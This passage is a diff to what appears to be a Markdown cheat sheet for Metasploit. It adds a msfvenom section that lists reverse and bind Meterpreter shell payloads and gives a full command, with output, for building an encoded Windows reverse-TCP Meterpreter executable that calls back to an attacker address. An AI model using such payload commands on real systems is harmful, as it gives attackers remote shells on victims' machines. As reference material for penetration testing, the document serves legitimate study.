@@ -192,8 +192,46 @@ meterpreter > exit
 [*] 192.168.0.2 - Meterpreter session 2 closed.  Reason: User exit
 ```
 
-### msfvenom 
-### msfupdate 
+### msfvenom
+Metasploit standalone payload generator that replaces msfpayload and msfencode.
+
+#### List: payloads, encoders, nops, platforms, formats, all.
+```sh 
+msfvenom -l payloads
+
+Framework Payloads (538 total) [--payload <value>]
+==================================================
+
+    Name                                                Description
+    ----                                                -----------
+
+    windows/meterpreter_bind_named_pipe                 Connect to victim and spawn a Meterpreter shell
+    windows/meterpreter_bind_tcp                        Connect to victim and spawn a Meterpreter shell
+    windows/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell
+    windows/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell
+    windows/meterpreter_reverse_ipv6_tcp                Connect back to attacker and spawn a Meterpreter shell
+    windows/meterpreter_reverse_tcp                     Connect back to attacker and spawn a Meterpreter shell
+
+and so on..
+```
+
+#### Craft example payload
+(payload not tested, this example is here to show you available options)
+```sh 
+msfvenom --payload windows/meterpreter/reverse_tcp LHOST=192.168.0.5 LPORT=1337 --format exe --arch x86 --encoder x86/shikata_ga_nai --platform windows --bad-chars '\x00\xff'  --iterations 2  --out test.exe
+Found 1 compatible encoders
+Attempting to encode payload with 2 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 368 (iteration=0)
+x86/shikata_ga_nai succeeded with size 395 (iteration=1)
+x86/shikata_ga_nai chosen with final size 395
+Payload size: 395 bytes
+Final size of exe file: 73802 bytes
+Saved as: test.exe
+```
+#### Custom payload (WORK IN PROGRESS)
+
+### msfupdate
+This is a command used to update Metasploit Framework, you need to simply launch it in the terminal.
 ### msfbinscan
 ### msfelfscan
 ### msfpescan 
